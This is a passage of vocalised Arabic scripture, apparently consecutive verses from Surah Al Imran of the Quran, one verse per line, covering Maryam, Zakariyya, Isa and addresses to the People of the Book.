ذٰلِكَ بِاَنَّهُمْ قَالُوْا لَنْ تَمَسَّنَا النَّارُ اِلَّآ اَيَّامًا مَّعْدُوْدٰتٍ ۖ وَغَرَّهُمْ فِيْ دِيْنِهِمْ مَّا كَانُوْا يَفْتَرُوْنَ
فَكَيْفَ اِذَا جَمَعْنٰهُمْ لِيَوْمٍ لَّا رَيْبَ فِيْهِ ۖ وَوُفِّيَتْ كُلُّ نَفْسٍ مَّا كَسَبَتْ وَهُمْ لَا يُظْلَمُوْنَ
قُلِ اللّٰهُمَّ مٰلِكَ الْمُلْكِ تُؤْتِى الْمُلْكَ مَنْ تَشَاۤءُ وَتَنْزِعُ الْمُلْكَ مِمَّنْ تَشَاۤءُ ۖ وَتُعِزُّ مَنْ تَشَاۤءُ وَتُذِلُّ مَنْ تَشَاۤءُ ۗ بِيَدِكَ الْخَيْرُ ۗ اِنَّكَ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
تُوْلِجُ الَّيْلَ فِى النَّهَارِ وَتُوْلِجُ النَّهَارَ فِى الَّيْلِ ۖ وَتُخْرِجُ الْحَيَّ مِنَ الْمَيِّتِ وَتُخْرِجُ الْمَيِّتَ مِنَ الْحَيِّ ۖ وَتَرْزُقُ مَنْ تَشَاۤءُ بِغَيْرِ حِسَابٍ
لَا يَتَّخِذِ الْمُؤْمِنُوْنَ الْكٰفِرِيْنَ اَوْلِيَاۤءَ مِنْ دُوْنِ الْمُؤْمِنِيْنَ ۚ وَمَنْ يَّفْعَلْ ذٰلِكَ فَلَيْسَ مِنَ اللّٰهِ فِيْ شَيْءٍ اِلَّآ اَنْ تَتَّقُوْا مِنْهُمْ تُقٰىةً ۗ وَيُحَذِّرُكُمُ اللّٰهُ نَفْسَهٗ ۗ وَاِلَى اللّٰهِ الْمَصِيْرُ
قُلْ اِنْ تُخْفُوْا مَا فِيْ صُدُوْرِكُمْ اَوْ تُبْدُوْهُ يَعْلَمْهُ اللّٰهُ ۗ وَيَعْلَمُ مَا فِى السَّمٰوٰتِ وَمَا فِى الْاَرْضِ ۗ وَاللّٰهُ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
يَوْمَ تَجِدُ كُلُّ نَفْسٍ مَّا عَمِلَتْ مِنْ خَيْرٍ مُّحْضَرًاۛ وَّمَا عَمِلَتْ مِنْ سُوْۤءٍۚ تَوَدُّ لَوْ اَنَّ بَيْنَهَا وَبَيْنَهٗٓ اَمَدًاۢ بَعِيْدًا ۗ وَيُحَذِّرُكُمُ اللّٰهُ نَفْسَهٗ ۗ وَاللّٰهُ رَءُوْفٌۢ بِالْعِبَادِ
قُلْ اِنْ كُنْتُمْ تُحِبُّوْنَ اللّٰهَ فَاتَّبِعُوْنِيْ يُحْبِبْكُمُ اللّٰهُ وَيَغْفِرْ لَكُمْ ذُنُوْبَكُمْ ۗ وَاللّٰهُ غَفُوْرٌ رَّحِيْمٌ
قُلْ اَطِيْعُوا اللّٰهَ وَالرَّسُوْلَ ۚ فَاِنْ تَوَلَّوْا فَاِنَّ اللّٰهَ لَا يُحِبُّ الْكٰفِرِيْنَ
اِنَّ اللّٰهَ اصْطَفٰٓى اٰدَمَ وَنُوْحًا وَّاٰلَ اِبْرٰهِيْمَ وَاٰلَ عِمْرٰنَ عَلَى الْعٰلَمِيْنَۙ
ذُرِّيَّةًۢ بَعْضُهَا مِنْۢ بَعْضٍ ۗ وَاللّٰهُ سَمِيْعٌ عَلِيْمٌ
اِذْ قَالَتِ امْرَاَتُ عِمْرٰنَ رَبِّ اِنِّيْ نَذَرْتُ لَكَ مَا فِيْ بَطْنِيْ مُحَرَّرًا فَتَقَبَّلْ مِنِّيْ ۚ اِنَّكَ اَنْتَ السَّمِيْعُ الْعَلِيْمُ
فَلَمَّا وَضَعَتْهَا قَالَتْ رَبِّ اِنِّيْ وَضَعْتُهَآ اُنْثٰى ۚ وَاللّٰهُ اَعْلَمُ بِمَا وَضَعَتْ ۗ وَلَيْسَ الذَّكَرُ كَالْاُنْثٰى ۚ وَاِنِّيْ سَمَّيْتُهَا مَرْيَمَ وَاِنِّيْٓ اُعِيْذُهَا بِكَ وَذُرِّيَّتَهَا مِنَ الشَّيْطٰنِ الرَّجِيْمِ
فَتَقَبَّلَهَا رَبُّهَا بِقَبُوْلٍ حَسَنٍ وَّاَنْۢبَتَهَا نَبَاتًا حَسَنًا ۙ وَّكَفَّلَهَا زَكَرِيَّا ۗ كُلَّمَا دَخَلَ عَلَيْهَا زَكَرِيَّا الْمِحْرَابَ وَجَدَ عِنْدَهَا رِزْقًا ۚ قَالَ يٰمَرْيَمُ اَنّٰى لَكِ هٰذَا ۗ قَالَتْ هُوَ مِنْ عِنْدِ اللّٰهِ ۗ اِنَّ اللّٰهَ يَرْزُقُ مَنْ يَّشَاۤءُ بِغَيْرِ حِسَابٍ
هُنَالِكَ دَعَا زَكَرِيَّا رَبَّهٗ ۚ قَالَ رَبِّ هَبْ لِيْ مِنْ لَّدُنْكَ ذُرِّيَّةً طَيِّبَةً ۚ اِنَّكَ سَمِيْعُ الدُّعَاۤءِ
فَنَادَتْهُ الْمَلٰۤىِٕكَةُ وَهُوَ قَاۤىِٕمٌ يُّصَلِّيْ فِى الْمِحْرَابِ ۙ اَنَّ اللّٰهَ يُبَشِّرُكَ بِيَحْيٰى مُصَدِّقًا بِكَلِمَةٍ مِّنَ اللّٰهِ وَسَيِّدًا وَّحَصُوْرًا وَّنَبِيًّا مِّنَ الصّٰلِحِيْنَ
قَالَ رَبِّ اَنّٰى يَكُوْنُ لِيْ غُلٰمٌ وَّقَدْ بَلَغَنِيَ الْكِبَرُ وَامْرَاَتِيْ عَاقِرٌ ۗ قَالَ كَذٰلِكَ اللّٰهُ يَفْعَلُ مَا يَشَاۤءُ
قَالَ رَبِّ اجْعَلْ لِّيْٓ اٰيَةً ۗ قَالَ اٰيَتُكَ اَلَّا تُكَلِّمَ النَّاسَ ثَلٰثَةَ اَيَّامٍ اِلَّا رَمْزًا ۗ وَاذْكُرْ رَّبَّكَ كَثِيْرًا وَّسَبِّحْ بِالْعَشِيِّ وَالْاِبْكَارِ
وَاِذْ قَالَتِ الْمَلٰۤىِٕكَةُ يٰمَرْيَمُ اِنَّ اللّٰهَ اصْطَفٰىكِ وَطَهَّرَكِ وَاصْطَفٰىكِ عَلٰى نِسَاۤءِ الْعٰلَمِيْنَ
يٰمَرْيَمُ اقْنُتِيْ لِرَبِّكِ وَاسْجُدِيْ وَارْكَعِيْ مَعَ الرّٰكِعِيْنَ
ذٰلِكَ مِنْ اَنْۢبَاۤءِ الْغَيْبِ نُوْحِيْهِ اِلَيْكَ ۗ وَمَا كُنْتَ لَدَيْهِمْ اِذْ يُلْقُوْنَ اَقْلَامَهُمْ اَيُّهُمْ يَكْفُلُ مَرْيَمَ ۖ وَمَا كُنْتَ لَدَيْهِمْ اِذْ يَخْتَصِمُوْنَ
اِذْ قَالَتِ الْمَلٰۤىِٕكَةُ يٰمَرْيَمُ اِنَّ اللّٰهَ يُبَشِّرُكِ بِكَلِمَةٍ مِّنْهُ ۖ اسْمُهُ الْمَسِيْحُ عِيْسَى ابْنُ مَرْيَمَ وَجِيْهًا فِى الدُّنْيَا وَالْاٰخِرَةِ وَمِنَ الْمُقَرَّبِيْنَ
وَيُكَلِّمُ النَّاسَ فِى الْمَهْدِ وَكَهْلًا وَّمِنَ الصّٰلِحِيْنَ
قَالَتْ رَبِّ اَنّٰى يَكُوْنُ لِيْ وَلَدٌ وَّلَمْ يَمْسَسْنِيْ بَشَرٌ ۗ قَالَ كَذٰلِكِ اللّٰهُ يَخْلُقُ مَا يَشَاۤءُ ۗ اِذَا قَضٰٓى اَمْرًا فَاِنَّمَا يَقُوْلُ لَهٗ كُنْ فَيَكُوْنُ
وَيُعَلِّمُهُ الْكِتٰبَ وَالْحِكْمَةَ وَالتَّوْرٰىةَ وَالْاِنْجِيْلَ
وَرَسُوْلًا اِلٰى بَنِيْٓ اِسْرَاۤءِيْلَۙ اَنِّيْ قَدْ جِئْتُكُمْ بِاٰيَةٍ مِّنْ رَّبِّكُمْ ۙ اَنِّيْٓ اَخْلُقُ لَكُمْ مِّنَ الطِّيْنِ كَهَيْـَٔةِ الطَّيْرِ فَاَنْفُخُ فِيْهِ فَيَكُوْنُ طَيْرًاۢ بِاِذْنِ اللّٰهِ ۚ وَاُبْرِئُ الْاَكْمَهَ وَالْاَبْرَصَ وَاُحْيِ الْمَوْتٰى بِاِذْنِ اللّٰهِ ۚ وَاُنَبِّئُكُمْ بِمَا تَأْكُلُوْنَ وَمَا تَدَّخِرُوْنَۙ فِيْ بُيُوْتِكُمْ ۗ اِنَّ فِيْ ذٰلِكَ لَاٰيَةً لَّكُمْ اِنْ كُنْتُمْ مُّؤْمِنِيْنَ
وَمُصَدِّقًا لِّمَا بَيْنَ يَدَيَّ مِنَ التَّوْرٰىةِ وَلِاُحِلَّ لَكُمْ بَعْضَ الَّذِيْ حُرِّمَ عَلَيْكُمْ ۚ وَجِئْتُكُمْ بِاٰيَةٍ مِّنْ رَّبِّكُمْ ۚ فَاتَّقُوا اللّٰهَ وَاَطِيْعُوْنِ
اِنَّ اللّٰهَ رَبِّيْ وَرَبُّكُمْ فَاعْبُدُوْهُ ۗ هٰذَا صِرَاطٌ مُّسْتَقِيْمٌ
فَلَمَّآ اَحَسَّ عِيْسٰى مِنْهُمُ الْكُفْرَ قَالَ مَنْ اَنْصَارِيْٓ اِلَى اللّٰهِ ۗ قَالَ الْحَوَارِيُّوْنَ نَحْنُ اَنْصَارُ اللّٰهِ ۚ اٰمَنَّا بِاللّٰهِ ۚ وَاشْهَدْ بِاَنَّا مُسْلِمُوْنَ
رَبَّنَآ اٰمَنَّا بِمَآ اَنْزَلْتَ وَاتَّبَعْنَا الرَّسُوْلَ فَاكْتُبْنَا مَعَ الشّٰهِدِيْنَ
وَمَكَرُوْا وَمَكَرَ اللّٰهُ ۗ وَاللّٰهُ خَيْرُ الْمٰكِرِيْنَ
اِذْ قَالَ اللّٰهُ يٰعِيْسٰىٓ اِنِّيْ مُتَوَفِّيْكَ وَرَافِعُكَ اِلَيَّ وَمُطَهِّرُكَ مِنَ الَّذِيْنَ كَفَرُوْا وَجَاعِلُ الَّذِيْنَ اتَّبَعُوْكَ فَوْقَ الَّذِيْنَ كَفَرُوْٓا اِلٰى يَوْمِ الْقِيٰمَةِ ۚ ثُمَّ اِلَيَّ مَرْجِعُكُمْ فَاَحْكُمُ بَيْنَكُمْ فِيْمَا كُنْتُمْ فِيْهِ تَخْتَلِفُوْنَ
فَاَمَّا الَّذِيْنَ كَفَرُوْا فَاُعَذِّبُهُمْ عَذَابًا شَدِيْدًا فِى الدُّنْيَا وَالْاٰخِرَةِ ۖ وَمَا لَهُمْ مِّنْ نّٰصِرِيْنَ
وَاَمَّا الَّذِيْنَ اٰمَنُوْا وَعَمِلُوا الصّٰلِحٰتِ فَيُوَفِّيْهِمْ اُجُوْرَهُمْ ۗ وَاللّٰهُ لَا يُحِبُّ الظّٰلِمِيْنَ
ذٰلِكَ نَتْلُوْهُ عَلَيْكَ مِنَ الْاٰيٰتِ وَالذِّكْرِ الْحَكِيْمِ
اِنَّ مَثَلَ عِيْسٰى عِنْدَ اللّٰهِ كَمَثَلِ اٰدَمَ ۗ خَلَقَهٗ مِنْ تُرَابٍ ثُمَّ قَالَ لَهٗ كُنْ فَيَكُوْنُ
اَلْحَقُّ مِنْ رَّبِّكَ فَلَا تَكُنْ مِّنَ الْمُمْتَرِيْنَ
فَمَنْ حَاۤجَّكَ فِيْهِ مِنْۢ بَعْدِ مَا جَاۤءَكَ مِنَ الْعِلْمِ فَقُلْ تَعَالَوْا نَدْعُ اَبْنَاۤءَنَا وَاَبْنَاۤءَكُمْ وَنِسَاۤءَنَا وَنِسَاۤءَكُمْ وَاَنْفُسَنَا وَاَنْفُسَكُمْ ۗ ثُمَّ نَبْتَهِلْ فَنَجْعَلْ لَّعْنَتَ اللّٰهِ عَلَى الْكٰذِبِيْنَ
اِنَّ هٰذَا لَهُوَ الْقَصُ الْحَقُّ ۚ وَمَا مِنْ اِلٰهٍ اِلَّا اللّٰهُ ۗ وَاِنَّ اللّٰهَ لَهُوَ الْعَزِيْزُ الْحَكِيْمُ
فَاِنْ تَوَلَّوْا فَاِنَّ اللّٰهَ عَلِيْمٌۢ بِالْمُفْسِدِيْنَ
قُلْ يٰٓاَهْلَ الْكِتٰبِ تَعَالَوْا اِلٰى كَلِمَةٍ سَوَاۤءٍۢ بَيْنَنَا وَبَيْنَكُمْ اَلَّا نَعْبُدَ اِلَّا اللّٰهَ وَلَا نُشْرِكَ بِهٖ شَيْـًٔا وَّلَا يَتَّخِذَ بَعْضُنَا بَعْضًا اَرْبَابًا مِّنْ دُوْنِ اللّٰهِ ۗ فَاِنْ تَوَلَّوْا فَقُوْلُوا اشْهَدُوْا بِاَنَّا مُسْلِمُوْنَ
يٰٓاَهْلَ الْكِتٰبِ لِمَ تُحَاۤجُّوْنَ فِيْٓ اِبْرٰهِيْمَ وَمَآ اُنْزِلَتِ التَّوْرٰىةُ وَالْاِنْجِيْلُ اِلَّا مِنْۢ بَعْدِهٖ ۗ اَفَلَا تَعْقِلُوْنَ
هٰٓاَنْتُمْ هٰٓؤُلَاۤءِ حَاجَجْتُمْ فِيْمَا لَكُمْ بِهٖ عِلْمٌ فَلِمَ تُحَاۤجُّوْنَ فِيْمَا لَيْسَ لَكُمْ بِهٖ عِلْمٌ ۗ وَاللّٰهُ يَعْلَمُ وَاَنْتُمْ لَا تَعْلَمُوْنَ
مَا كَانَ اِبْرٰهِيْمُ يَهُوْدِيًّا وَّلَا نَصْرَانِيًّا وَّلٰكِنْ كَانَ حَنِيْفًا مُّسْلِمًا ۗ وَمَا كَانَ مِنَ الْمُشْرِكِيْنَ
اِنَّ اَوْلَى النَّاسِ بِاِبْرٰهِيْمَ لَلَّذِيْنَ اتَّبَعُوْهُ وَهٰذَا النَّبِيُّ وَالَّذِيْنَ اٰمَنُوْا ۗ وَاللّٰهُ وَلِيُّ الْمُؤْمِنِيْنَ
وَدَّتْ طَّاۤىِٕفَةٌ مِّنْ اَهْلِ الْكِتٰبِ لَوْ يُضِلُّوْنَكُمْ ۗ وَمَا يُضِلُّوْنَ اِلَّآ اَنْفُسَهُمْ وَمَا يَشْعُرُوْنَ
يٰٓاَهْلَ الْكِتٰبِ لِمَ تَكْفُرُوْنَ بِاٰيٰتِ اللّٰهِ وَاَنْتُمْ تَشْهَدُوْنَ
يٰٓاَهْلَ الْكِتٰبِ لِمَ تَلْبِسُوْنَ الْحَقَّ بِالْبَاطِلِ وَتَكْتُمُوْنَ الْحَقَّ وَاَنْتُمْ تَعْلَمُوْنَ
وَقَالَتْ طَّاۤىِٕفَةٌ مِّنْ اَهْلِ الْكِتٰبِ اٰمِنُوْا بِالَّذِيْٓ اُنْزِلَ عَلَى الَّذِيْنَ اٰمَنُوْا وَجْهَ النَّهَارِ وَاكْفُرُوْٓا اٰخِرَهٗ لَعَلَّهُمْ يَرْجِعُوْنَ
وَلَا تُؤْمِنُوْٓا اِلَّا لِمَنْ تَبِعَ دِيْنَكُمْ ۗ قُلْ اِنَّ الْهُدٰى هُدَى اللّٰهِ ۙ اَنْ يُّؤْتٰٓى اَحَدٌ مِّثْلَ مَآ اُوْتِيْتُمْ اَوْ يُحَاۤجُّوْكُمْ عِنْدَ رَبِّكُمْ ۗ قُلْ اِنَّ الْفَضْلَ بِيَدِ اللّٰهِ ۚ يُؤْتِيْهِ مَنْ يَّشَاۤءُ ۗ وَاللّٰهُ وَاسِعٌ عَلِيْمٌ
يَخْتَصُّ بِرَحْمَتِهٖ مَنْ يَّشَاۤءُ ۗ وَاللّٰهُ ذُو الْفَضْلِ الْعَظِيْمِ
وَمِنْ اَهْلِ الْكِتٰبِ مَنْ اِنْ تَأْمَنْهُ بِقِنْطَارٍ يُّؤَدِّهٖٓ اِلَيْكَ ۚ وَمِنْهُمْ مَّنْ اِنْ تَأْمَنْهُ بِدِيْنَارٍ لَّا يُؤَدِّهٖٓ اِلَيْكَ اِلَّا مَا دُمْتَ عَلَيْهِ قَاۤىِٕمًا ۗ ذٰلِكَ بِاَنَّهُمْ قَالُوْا لَيْسَ عَلَيْنَا فِى الْاُمِّيّٖنَ سَبِيْلٌ ۚ وَيَقُوْلُوْنَ عَلَى اللّٰهِ الْكَذِبَ وَهُمْ يَعْلَمُوْنَ
بَلٰى مَنْ اَوْفٰى بِعَهْدِهٖ وَاتَّقٰى فَاِنَّ اللّٰهَ يُحِبُّ الْمُتَّقِيْنَ
اِنَّ الَّذِيْنَ يَشْتَرُوْنَ بِعَهْدِ اللّٰهِ وَاَيْمَانِهِمْ ثَمَنًا قَلِيْلًا اُولٰۤىِٕكَ لَا خَلَاقَ لَهُمْ فِى الْاٰخِرَةِ وَلَا يُكَلِّمُهُمُ اللّٰهُ وَلَا يَنْظُرُ اِلَيْهِمْ يَوْمَ الْقِيٰمَةِ وَلَا يُزَكِّيْهِمْ ۖ وَلَهُمْ عَذَابٌ اَلِيْمٌ
وَاِنَّ مِنْهُمْ لَفَرِيْقًا يَّلْوٗنَ اَلْسِنَتَهُمْ بِالْكِتٰبِ لِتَحْسَبُوْهُ مِنَ الْكِتٰبِ وَمَا هُوَ مِنَ الْكِتٰبِ ۚ وَيَقُوْلُوْنَ هُوَ مِنْ عِنْدِ اللّٰهِ ۖ وَمَا هُوَ مِنْ عِنْدِ اللّٰهِ ۚ وَيَقُوْلُوْنَ عَلَى اللّٰهِ الْكَذِبَ وَهُمْ يَعْلَمُوْنَ
مَا كَانَ لِبَشَرٍ اَنْ يُّؤْتِيَهُ اللّٰهُ الْكِتٰبَ وَالْحُكْمَ وَالنُّبُوَّةَ ثُمَّ يَقُوْلَ لِلنَّاسِ كُوْنُوْا عِبَادًا لِّيْ مِنْ دُوْنِ اللّٰهِ وَلٰكِنْ كُوْنُوْا رَبّٰنِيّٖنَ بِمَا كُنْتُمْ تُعَلِّمُوْنَ الْكِتٰبَ وَبِمَا كُنْتُمْ تَدْرُسُوْنَ
وَلَا يَأْمُرَكُمْ اَنْ تَتَّخِذُوا الْمَلٰۤىِٕكَةَ وَالنَّبِيّٖنَ اَرْبَابًا ۗ اَيَأْمُرُكُمْ بِالْكُفْرِ بَعْدَ اِذْ اَنْتُمْ مُّسْلِمُوْنَ
وَاِذْ اَخَذَ اللّٰهُ مِيْثَاقَ النَّبِيّٖنَ لَمَآ اٰتَيْتُكُمْ مِّنْ كِتٰبٍ وَّحِكْمَةٍ ثُمَّ جَاۤءَكُمْ رَسُوْلٌ مُّصَدِّقٌ لِّمَا مَعَكُمْ لَتُؤْمِنُنَّ بِهٖ وَلَتَنْصُرُنَّهٗ ۗ قَالَ ءَاَقْرَرْتُمْ وَاَخَذْتُمْ عَلٰى ذٰلِكُمْ اِصْرِيْ ۗ قَالُوْٓا اَقْرَرْنَا ۗ قَالَ فَاشْهَدُوْا وَاَنَا مَعَكُمْ مِّنَ الشّٰهِدِيْنَ
فَمَنْ تَوَلّٰى بَعْدَ ذٰلِكَ فَاُولٰۤىِٕكَ هُمُ الْفٰسِقُوْنَ
اَفَغَيْرَ دِيْنِ اللّٰهِ يَبْغُوْنَ وَلَهٗٓ اَسْلَمَ مَنْ فِى السَّمٰوٰتِ وَالْاَرْضِ طَوْعًا وَّكَرْهًا وَّاِلَيْهِ يُرْجَعُوْنَ
قُلْ اٰمَنَّا بِاللّٰهِ وَمَآ اُنْزِلَ عَلَيْنَا وَمَآ اُنْزِلَ عَلٰٓى اِبْرٰهِيْمَ وَاِسْمٰعِيْلَ وَاِسْحٰقَ وَيَعْقُوْبَ وَالْاَسْبَاطِ وَمَآ اُوْتِيَ مُوْسٰى وَعِيْسٰى وَالنَّبِيُّوْنَ مِنْ رَّبِّهِمْ ۖ لَا نُفَرِّقُ بَيْنَ اَحَدٍ مِّنْهُمْ ۖ وَنَحْنُ لَهٗ مُسْلِمُوْنَ
وَمَنْ يَّبْتَغِ غَيْرَ الْاِسْلَامِ دِيْنًا فَلَنْ يُّقْبَلَ مِنْهُ ۚ وَهُوَ فِى الْاٰخِرَةِ مِنَ الْخٰسِرِيْنَ
كَيْفَ يَهْدِى اللّٰهُ قَوْمًا كَفَرُوْا بَعْدَ اِيْمَانِهِمْ وَشَهِدُوْٓا اَنَّ الرَّسُوْلَ حَقٌّ وَّجَاۤءَهُمُ الْبَيِّنٰتُ ۗ وَاللّٰهُ لَا يَهْدِى الْقَوْمَ الظّٰلِمِيْنَ
اُولٰۤىِٕكَ جَزَاۤؤُهُمْ اَنَّ عَلَيْهِمْ لَعْنَةَ اللّٰهِ وَالْمَلٰۤىِٕكَةِ وَالنَّاسِ اَجْمَعِيْنَۙ
خٰلِدِيْنَ فِيْهَا ۚ لَا يُخَفَّفُ عَنْهُمُ الْعَذَابُ وَلَا هُمْ يُنْظَرُوْنَۙ
اِلَّا الَّذِيْنَ تَابُوْا مِنْۢ بَعْدِ ذٰلِكَ وَاَصْلَحُوْا ۖ فَاِنَّ اللّٰهَ غَفُوْرٌ رَّحِيْمٌ
اِنَّ الَّذِيْنَ كَفَرُوْا بَعْدَ اِيْمَانِهِمْ ثُمَّ ازْدَادُوْا كُفْرًا لَّنْ تُقْبَلَ تَوْبَتُهُمْ ۚ وَاُولٰۤىِٕكَ هُمُ الضَّاۤلُّوْنَ
اِنَّ الَّذِيْنَ كَفَرُوْا وَمَاتُوْا وَهُمْ كُفَّارٌ فَلَنْ يُّقْبَلَ مِنْ اَحَدِهِمْ مِّلْءُ الْاَرْضِ ذَهَبًا وَّلَوِ افْتَدٰى بِهٖ ۗ اُولٰۤىِٕكَ لَهُمْ عَذَابٌ اَلِيْمٌ وَّمَا لَهُمْ مِّنْ نّٰصِرِيْنَ
لَنْ تَنَالُوا الْبِرَّ حَتّٰى تُنْفِقُوْا مِمَّا تُحِبُّوْنَ ۗ وَمَا تُنْفِقُوْا مِنْ شَيْءٍ فَاِنَّ اللّٰهَ بِهٖ عَلِيْمٌ
كُلُّ الطَّعَامِ كَانَ حِلًّا لِّبَنِيْٓ اِسْرَاۤءِيْلَ اِلَّا مَا حَرَّمَ اِسْرَاۤءِيْلُ عَلٰى نَفْسِهٖ مِنْ قَبْلِ اَنْ تُنَزَّلَ التَّوْرٰىةُ ۗ قُلْ فَأْتُوْا بِالتَّوْرٰىةِ فَاتْلُوْهَآ اِنْ كُنْتُمْ صٰدِقِيْنَ
فَمَنِ افْتَرٰى عَلَى اللّٰهِ الْكَذِبَ مِنْۢ بَعْدِ ذٰلِكَ فَاُولٰۤىِٕكَ هُمُ الظّٰلِمُوْنَ
قُلْ صَدَقَ اللّٰهُ ۗ فَاتَّبِعُوْا مِلَّةَ اِبْرٰهِيْمَ حَنِيْفًا ۗ وَمَا كَانَ مِنَ الْمُشْرِكِيْنَ
اِنَّ اَوَّلَ بَيْتٍ وُّضِعَ لِلنَّاسِ لَلَّذِيْ بِبَكَّةَ مُبٰرَكًا وَّهُدًى لِّلْعٰلَمِيْنَۚ
فِيْهِ اٰيٰتٌۢ بَيِّنٰتٌ مَّقَامُ اِبْرٰهِيْمَ ۚ وَمَنْ دَخَلَهٗ كَانَ اٰمِنًا ۗ وَلِلّٰهِ عَلَى النَّاسِ حِجُّ الْبَيْتِ مَنِ اسْتَطَاعَ اِلَيْهِ سَبِيْلًا ۗ وَمَنْ كَفَرَ فَاِنَّ اللّٰهَ غَنِيٌّ عَنِ الْعٰلَمِيْنَ
قُلْ يٰٓاَهْلَ الْكِتٰبِ لِمَ تَكْفُرُوْنَ بِاٰيٰتِ اللّٰهِ ۖ وَاللّٰهُ شَهِيْدٌ عَلٰى مَا تَعْمَلُوْنَ
قُلْ يٰٓاَهْلَ الْكِتٰبِ لِمَ تَصُدُّوْنَ عَنْ سَبِيْلِ اللّٰهِ مَنْ اٰمَنَ تَبْغُوْنَهَا عِوَجًا وَّاَنْتُمْ شُهَدَاۤءُ ۗ وَمَا اللّٰهُ بِغَافِلٍ عَمَّا تَعْمَلُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اِنْ تُطِيْعُوْا فَرِيْقًا مِّنَ الَّذِيْنَ اُوْتُوا الْكِتٰبَ يَرُدُّوْكُمْ بَعْدَ اِيْمَانِكُمْ كٰفِرِيْنَ
وَكَيْفَ تَكْفُرُوْنَ وَاَنْتُمْ تُتْلٰى عَلَيْكُمْ اٰيٰتُ اللّٰهِ وَفِيْكُمْ رَسُوْلُهٗ ۗ وَمَنْ يَّعْتَصِمْ بِاللّٰهِ فَقَدْ هُدِيَ اِلٰى صِرَاطٍ مُّسْتَقِيْمٍ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوا اتَّقُوا اللّٰهَ حَقَّ تُقٰىتِهٖ وَلَا تَمُوْتُنَّ اِلَّا وَاَنْتُمْ مُّسْلِمُوْنَ
وَاعْتَصِمُوْا بِحَبْلِ اللّٰهِ جَمِيْعًا وَّلَا تَفَرَّقُوْا ۖ وَاذْكُرُوْا نِعْمَتَ اللّٰهِ عَلَيْكُمْ اِذْ كُنْتُمْ اَعْدَاۤءً فَاَلَّفَ بَيْنَ قُلُوْبِكُمْ فَاَصْبَحْتُمْ بِنِعْمَتِهٖٓ اِخْوَانًا ۚ وَكُنْتُمْ عَلٰى شَفَا حُفْرَةٍ مِّنَ النَّارِ فَاَنْقَذَكُمْ مِّنْهَا ۗ كَذٰلِكَ يُبَيِّنُ اللّٰهُ لَكُمْ اٰيٰتِهٖ لَعَلَّكُمْ تَهْتَدُوْنَ
وَلْتَكُنْ مِّنْكُمْ اُمَّةٌ يَّدْعُوْنَ اِلَى الْخَيْرِ وَيَأْمُرُوْنَ بِالْمَعْرُوْفِ وَيَنْهَوْنَ عَنِ الْمُنْكَرِ ۗ وَاُولٰۤىِٕكَ هُمُ الْمُفْلِحُوْنَ
وَلَا تَكُوْنُوْا كَالَّذِيْنَ تَفَرَّقُوْا وَاخْتَلَفُوْا مِنْۢ بَعْدِ مَا جَاۤءَهُمُ الْبَيِّنٰتُ ۗ وَاُولٰۤىِٕكَ لَهُمْ عَذَابٌ عَظِيْمٌۙ
يَوْمَ تَبْيَضُّ وُجُوْهٌ وَّتَسْوَدُّ وُجُوْهٌ ۚ فَاَمَّا الَّذِيْنَ اسْوَدَّتْ وُجُوْهُمْ اَكَفَرْتُمْ بَعْدَ اِيْمَانِكُمْ فَذُوْقُوا الْعَذَابَ بِمَا كُنْتُمْ تَكْفُرُوْنَ
وَاَمَّا الَّذِيْنَ ابْيَضَّتْ وُجُوْهُمْ فَفِيْ رَحْمَةِ اللّٰهِ ۗ هُمْ فِيْهَا خٰلِدُوْنَ
تِلْكَ اٰيٰتُ اللّٰهِ نَتْلُوْهَا عَلَيْكَ بِالْحَقِّ ۗ وَمَا اللّٰهُ يُرِيْدُ ظُلْمًا لِّلْعٰلَمِيْنَ
وَلِلّٰهِ مَا فِى السَّمٰوٰتِ وَمَا فِى الْاَرْضِ ۗ وَاِلَى اللّٰهِ تُرْجَعُ الْاُمُوْرُ
كُنْتُمْ خَيْرَ اُمَّةٍ اُخْرِجَتْ لِلنَّاسِ تَأْمُرُوْنَ بِالْمَعْرُوْفِ وَتَنْهَوْنَ عَنِ الْمُنْكَرِ وَتُؤْمِنُوْنَ بِاللّٰهِ ۗ وَلَوْ اٰمَنَ اَهْلُ الْكِتٰبِ لَكَانَ خَيْرًا لَّهُمْ ۗ مِنْهُمُ الْمُؤْمِنُوْنَ وَاَكْثَرُهُمُ الْفٰسِقُوْنَ
لَنْ يَّضُرُّوْكُمْ اِلَّآ اَذًى ۗ وَاِنْ يُّقَاتِلُوْكُمْ يُوَلُّوْكُمُ الْاَدْبَارَ ۖ ثُمَّ لَا يُنْصَرُوْنَ
ضُرِبَتْ عَلَيْهِمُ الذِّلَّةُ اَيْنَ مَا ثُقِفُوْٓا اِلَّا بِحَبْلٍ مِّنَ اللّٰهِ وَحَبْلٍ مِّنَ النَّاسِ وَبَاۤءُوْ بِغَضَبٍ مِّنَ اللّٰهِ وَضُرِبَتْ عَلَيْهِمُ الْمَسْكَنَةُ ۗ ذٰلِكَ بِاَنَّهُمْ كَانُوْا يَكْفُرُوْنَ بِاٰيٰتِ اللّٰهِ وَيَقْتُلُوْنَ الْاَنْۢبِيَاۤءَ بِغَيْرِ حَقٍّ ۗ ذٰلِكَ بِمَا عَصَوْا وَّكَانُوْا يَعْتَدُوْنَ
لَيْسُوْا سَوَاۤءً ۗ مِنْ اَهْلِ الْكِتٰبِ اُمَّةٌ قَاۤىِٕمَةٌ يَّتْلُوْنَ اٰيٰتِ اللّٰهِ اٰنَاۤءَ الَّيْلِ وَهُمْ يَسْجُدُوْنَ
يُؤْمِنُوْنَ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ وَيَأْمُرُوْنَ بِالْمَعْرُوْفِ وَيَنْهَوْنَ عَنِ الْمُنْكَرِ وَيُسَارِعُوْنَ فِى الْخَيْرٰتِ ۗ وَاُولٰۤىِٕكَ مِنَ الصّٰلِحِيْنَ
وَمَا يَفْعَلُوْا مِنْ خَيْرٍ فَلَنْ يُّكْفَرُوْهُ ۗ وَاللّٰهُ عَلِيْمٌۢ بِالْمُتَّقِيْنَ
اِنَّ الَّذِيْنَ كَفَرُوْا لَنْ تُغْنِيَ عَنْهُمْ اَمْوَالُهُمْ وَلَآ اَوْلَادُهُمْ مِّنَ اللّٰهِ شَيْـًٔا ۚ وَاُولٰۤىِٕكَ اَصْحٰبُ النَّارِ ۚ هُمْ فِيْهَا خٰلِدُوْنَ
